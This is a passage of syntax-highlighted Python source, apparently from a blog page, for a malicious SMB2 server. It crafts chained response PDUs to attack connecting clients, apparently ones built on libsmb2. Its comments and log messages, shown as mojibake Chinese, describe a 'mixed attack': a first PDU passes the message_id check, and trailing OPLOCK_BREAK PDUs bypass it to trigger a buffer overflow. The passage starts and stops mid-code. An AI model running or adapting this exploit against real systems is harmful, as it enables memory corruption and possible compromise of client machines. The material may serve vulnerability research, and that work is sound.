class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        payload += <span class="string">b&#x27;&#x27;</span>                            <span class="comment"># SecurityBuffer (empty)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> header + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_tree_connect_response</span>(<span class="params">self, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºSMB2 Tree Connectå“åº”&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># åˆ›å»ºTree Connectå“åº”å¤´éƒ¨</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=<span class="number">0x0003</span>,          <span class="comment"># SMB2_TREE_CONNECT</span></span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,</span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>,        <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">            tree_id=<span class="number">1</span>                <span class="comment"># åˆ†é…ä¸€ä¸ªTreeID</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Tree Connect Response payload</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> header + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_normal_smb2_response</span>(<span class="params">self, command=<span class="number">0x0000</span>, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºæ­£å¸¸çš„å•ä¸ªSMB2å“åº”ï¼ˆéé“¾å¼ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># åˆ›å»ºæ­£å¸¸çš„SMB2å¤´éƒ¨</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=command,</span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,          <span class="comment"># å•ä¸ªPDUï¼Œä¸é“¾å¼</span></span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>         <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ ¹æ®å‘½ä»¤ç±»å‹åˆ›å»ºç›¸åº”è½½è·</span></span><br><span class="line">        <span class="keyword">if</span> command == <span class="number">0x0000</span>:  <span class="comment"># NEGOTIATE</span></span><br><span class="line">            payload = self.create_negotiate_response_payload()</span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0001</span>:  <span class="comment"># SESSION_SETUP</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0003</span>:  <span class="comment"># TREE_CONNECT</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0005</span>:  <span class="comment"># CREATE</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">89</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Flags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">1</span>)           <span class="comment"># CreateAction</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreationTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastAccessTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastWriteTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># ChangeTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># AllocationSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># EndofFile</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x80</span>)        <span class="comment"># FileAttributes</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsOffset</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsLength</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># å…¶ä»–å‘½ä»¤çš„åŸºæœ¬å“åº”</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">8</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">14</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç»„åˆå®Œæ•´å“åº”</span></span><br><span class="line">        smb2_response = header + payload</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ·»åŠ NetBIOSå¤´éƒ¨</span></span><br><span class="line">        netbios_header = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="built_in">len</span>(smb2_response))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> netbios_header + smb2_response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_chain_pdu_sequence</span>(<span class="params">self, base_command=<span class="number">0x0003</span>, pdu_count=<span class="literal">None</span>, original_message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºé“¾å¼ PDU åºåˆ— - ä½¿ç”¨æ··åˆæ”»å‡»ç­–ç•¥ç»•è¿‡message_idæ£€æŸ¥&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> pdu_count <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            pdu_count = self.chain_count</span><br><span class="line">        </span><br><span class="line">        logger.info(<span class="string">f&quot;ğŸš¨ ç”Ÿæˆæ··åˆæ”»å‡»é“¾å¼PDUåºåˆ—:&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - ç¬¬1ä¸ªPDU: <span class="subst">&#123;self.get_command_name(base_command)&#125;</span> (message_id=<span class="subst">&#123;original_message_id&#125;</span>) - é€šè¿‡éªŒè¯&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - å<span class="subst">&#123;pdu_count-<span class="number">1</span>&#125;</span>ä¸ªPDU: OPLOCK_BREAK (ä»»æ„message_id) - ç»•è¿‡éªŒè¯&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - æ€»PDUæ•°é‡: <span class="subst">&#123;pdu_count&#125;</span> ä¸ªï¼Œç”¨äºè§¦å‘ç¼“å†²åŒºæº¢å‡º&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        pdus = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pdu_count):</span><br><span class="line">            <span class="comment"># ç¬¬ä¸€ä¸ªPDUä½¿ç”¨åŸå§‹å‘½ä»¤å’Œmessage_idï¼Œåç»­PDUä½¿ç”¨OPLOCK_BREAKç»•è¿‡æ£€æŸ¥</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># ç¬¬ä¸€ä¸ªPDUï¼šä½¿ç”¨æ­£å¸¸å‘½ä»¤ï¼Œç¡®ä¿é€šè¿‡message_idåŒ¹é…</span></span><br><span class="line">                current_command = base_command</span><br><span class="line">                msg_id = original_message_id</span><br><span class="line">                logger.debug(<span class="string">f&quot;PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: ä½¿ç”¨æ­£å¸¸å‘½ä»¤ <span class="subst">&#123;self.get_command_name(current_command)&#125;</span>, message_id=<span class="subst">&#123;msg_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># åç»­PDUï¼šä½¿ç”¨OPLOCK_BREAKç»•è¿‡message_idæ£€æŸ¥</span></span><br><span class="line">                current_command = <span class="number">0x0012</span>  <span class="comment"># SMB2_OPLOCK_BREAK = 18 = 0x12</span></span><br><span class="line">                msg_id = <span class="number">0x999</span> + i  <span class="comment"># ä»»æ„message_idï¼Œä¸éœ€è¦åŒ¹é…</span></span><br><span class="line">                logger.debug(<span class="string">f&quot;PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: ä½¿ç”¨OPLOCK_BREAKç»•è¿‡æ£€æŸ¥, message_id=<span class="subst">&#123;msg_id&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ ¹æ®å‘½ä»¤ç±»å‹åˆ›å»ºè½½è·</span></span><br><span class="line">            <span class="keyword">if</span> current_command == <span class="number">0x0012</span>:  <span class="comment"># OPLOCK_BREAK</span></span><br><span class="line">                <span class="comment"># OPLOCK_BREAK Response payload (24å­—èŠ‚)</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">24</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel  </span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">                payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0000</span>:  <span class="comment"># NEGOTIATE</span></span><br><span class="line">                payload = self.create_negotiate_response_payload()</span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0003</span>:  <span class="comment"># TREE_CONNECT</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0001</span>:  <span class="comment"># SESSION_SETUP</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0005</span>:  <span class="comment"># CREATE</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">89</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Flags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">1</span>)           <span class="comment"># CreateAction</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreationTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastAccessTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastWriteTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># ChangeTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># AllocationSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># EndofFile</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x80</span>)        <span class="comment"># FileAttributes</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">                payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsOffset</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsLength</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># å…¶ä»–å‘½ä»¤çš„åŸºæœ¬å“åº”</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">8</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">14</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 8å­—èŠ‚å¯¹é½å¡«å…… - å…³é”®ï¼å‚è€ƒsmb2_read_dataçš„å¤„ç†æ–¹å¼</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(payload) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                payload += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è®¡ç®— NextCommand åç§» - å‚è€ƒlibsmb2çš„é“¾å¼PDUå¤„ç†</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; pdu_count - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># SMB2å¤´éƒ¨(64å­—èŠ‚) + è½½è·é•¿åº¦ï¼Œç„¶å8å­—èŠ‚å¯¹é½</span></span><br><span class="line">                next_offset = ((<span class="number">64</span> + <span class="built_in">len</span>(payload)) + <span class="number">7</span>) &amp; ~<span class="number">7</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                next_offset = <span class="number">0</span>  <span class="comment"># æœ€åä¸€ä¸ªPDUï¼ŒNextCommand=0è¡¨ç¤ºé“¾å¼ç»“æŸ</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ›å»ºPDUå¤´éƒ¨</span></span><br><span class="line">            header = self.create_smb2_header(</span><br><span class="line">                command=current_command,      <span class="comment"># ç¬¬ä¸€ä¸ªç”¨åŸå§‹å‘½ä»¤ï¼Œåç»­ç”¨OPLOCK_BREAK</span></span><br><span class="line">                message_id=msg_id,           <span class="comment"># ç¬¬ä¸€ä¸ªç”¨åŸå§‹message_idï¼Œåç»­ä»»æ„</span></span><br><span class="line">                next_command=next_offset,    <span class="comment"># é“¾å¼åç§»</span></span><br><span class="line">                status=<span class="number">0x00000000</span>,           <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">                flags=<span class="number">0x00000001</span>,            <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">                tree_id=<span class="number">1</span> <span class="keyword">if</span> current_command == <span class="number">0x0003</span> <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                session_id=<span class="number">1</span> <span class="keyword">if</span> current_command <span class="keyword">in</span> [<span class="number">0x0001</span>, <span class="number">0x0003</span>] <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">                logger.error(<span class="string">f&quot;åˆ›å»ºç¬¬ <span class="subst">&#123;i&#125;</span> ä¸ªPDUå¤´éƒ¨å¤±è´¥&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç»„è£…PDUï¼ˆå¤´éƒ¨+è½½è·ï¼‰</span></span><br><span class="line">            complete_pdu = header + payload</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç¡®ä¿æ•´ä¸ªPDU 8å­—èŠ‚å¯¹é½ï¼ˆå‚è€ƒlibsmb2å¤„ç†æ–¹å¼ï¼‰</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(complete_pdu) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                complete_pdu += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">                </span><br><span class="line">            pdus.append(complete_pdu)</span><br><span class="line">            </span><br><span class="line">            logger.debug(<span class="string">f&quot;æ··åˆæ”»å‡»PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;pdu_count&#125;</span>: Command=<span class="subst">&#123;self.get_command_name(current_command)&#125;</span>, MessageID=<span class="subst">&#123;msg_id&#125;</span>, NextCommand=0x<span class="subst">&#123;next_offset:08X&#125;</span>, é•¿åº¦=<span class="subst">&#123;<span class="built_in">len</span>(complete_pdu)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        chain_data = <span class="string">b&#x27;&#x27;</span>.join(pdus)</span><br><span class="line">        logger.info(<span class="string">f&quot;ğŸš¨ æ··åˆæ”»å‡»é“¾å¼PDUç”Ÿæˆå®Œæˆ:&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - æ€»å¤§å°: <span class="subst">&#123;<span class="built_in">len</span>(chain_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - æ”»å‡»ç­–ç•¥: ç¬¬1ä¸ªPDUé€šè¿‡message_idéªŒè¯ï¼Œåç»­<span class="subst">&#123;pdu_count-<span class="number">1</span>&#125;</span>ä¸ªOPLOCK_BREAK PDUç»•è¿‡éªŒè¯&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - é¢„æœŸæ•ˆæœ: è§¦å‘ <span class="subst">&#123;pdu_count * <span class="number">4</span>&#125;</span>+ æ¬¡smb2_add_iovectorè°ƒç”¨ï¼Œå¯¼è‡´ç¼“å†²åŒºæº¢å‡º&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> chain_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_command_name</span>(<span class="params">self, command</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è·å–SMB2å‘½ä»¤åç§°&quot;&quot;&quot;</span></span><br><span class="line">        command_names = &#123;</span><br><span class="line">            <span class="number">0x0000</span>: <span class="string">&quot;NEGOTIATE&quot;</span>,</span><br><span class="line">            <span class="number">0x0001</span>: <span class="string">&quot;SESSION_SETUP&quot;</span>, </span><br><span class="line">            <span class="number">0x0003</span>: <span class="string">&quot;TREE_CONNECT&quot;</span>,</span><br><span class="line">            <span class="number">0x0005</span>: <span class="string">&quot;CREATE&quot;</span>,</span><br><span class="line">            <span class="number">0x0006</span>: <span class="string">&quot;CLOSE&quot;</span>,</span><br><span class="line">            <span class="number">0x0008</span>: <span class="string">&quot;READ&quot;</span>,</span><br><span class="line">            <span class="number">0x0009</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">            <span class="number">0x0012</span>: <span class="string">&quot;OPLOCK_BREAK&quot;</span>  <span class="comment"># 18 = 0x12</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> command_names.get(command, <span class="string">f&quot;UNKNOWN(0x<span class="subst">&#123;command:04X&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_client_connection</span>(<span class="params">self, client_socket, client_addr</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†å®¢æˆ·ç«¯è¿æ¥&quot;&quot;&quot;</span></span><br><span class="line">        client_id = self.clients_served</span><br><span class="line">        self.clients_served += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] è¿æ¥æ¥è‡ª: <span class="subst">&#123;client_addr&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æŒç»­å¤„ç†SMB2è¯·æ±‚</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚</span></span><br><span class="line">                initial_data = client_socket.recv(<span class="number">8192</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> initial_data:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å®¢æˆ·ç«¯å…³é—­è¿æ¥&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &lt; <span class="number">4</span>:</span><br><span class="line">                    logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] æ¥æ”¶åˆ°çš„æ•°æ®å¤ªçŸ­&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] æ¥æ”¶åˆ° <span class="subst">&#123;<span class="built_in">len</span>(initial_data)&#125;</span> å­—èŠ‚æ•°æ®&quot;</span>)</span><br><span class="line">                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] åŸå§‹æ•°æ®å‰32å­—èŠ‚: <span class="subst">&#123;hexlify(initial_data[:<span class="number">32</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è§£æè¯·æ±‚</span></span><br><span class="line">                response_data = <span class="literal">None</span></span><br><span class="line">                smb2_command = <span class="literal">None</span></span><br><span class="line">                message_id = <span class="number">0</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç®€å•è§£æNetBIOSå¤´éƒ¨</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &gt;= <span class="number">4</span>:</span><br><span class="line">                    nb_length = struct.unpack(<span class="string">&#x27;&gt;L&#x27;</span>, initial_data[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] NetBIOSé•¿åº¦: <span class="subst">&#123;nb_length&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># è§£æSMB2å¤´éƒ¨</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &gt;= <span class="number">68</span>:  <span class="comment"># NetBIOS(4) + SMB2å¤´éƒ¨(64)</span></span><br><span class="line">                        smb2_data = initial_data[<span class="number">4</span>:]</span><br><span class="line">                        <span class="keyword">if</span> smb2_data[:<span class="number">4</span>] == <span class="string">b&#x27;\xFE\x53\x4D\x42&#x27;</span>:</span><br><span class="line">                            smb2_command = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, smb2_data[<span class="number">12</span>:<span class="number">14</span>])[<span class="number">0</span>]</span><br><span class="line">                            message_id = struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, smb2_data[<span class="number">24</span>:<span class="number">32</span>])[<span class="number">0</span>]</span><br><span class="line">                            logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] SMB2å‘½ä»¤: 0x<span class="subst">&#123;smb2_command:04X&#125;</span> (<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>), MessageID: <span class="subst">&#123;message_id&#125;</span>&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            <span class="comment"># æ ¹æ®å‘½ä»¤ç±»å‹å†³å®šå“åº”ç­–ç•¥</span></span><br><span class="line">                            <span class="keyword">if</span> smb2_command <span class="keyword">in</span> [<span class="number">0x0000</span>, <span class="number">0x0001</span>, <span class="number">0x0003</span>]:  <span class="comment"># NEGOTIATE, SESSION_SETUP, TREE_CONNECT</span></span><br><span class="line">                                <span class="comment"># è¿™äº›åŸºç¡€æ¡æ‰‹å‘½ä»¤å§‹ç»ˆè¿”å›å•ä¸ªæ­£å¸¸å“åº”ï¼ˆéé“¾å¼ï¼‰</span></span><br><span class="line">                                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] åŸºç¡€æ¡æ‰‹é˜¶æ®µï¼š<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>ï¼Œå‘é€å•ä¸ªæ­£å¸¸å“åº”&quot;</span>)</span><br><span class="line">                                response_data = 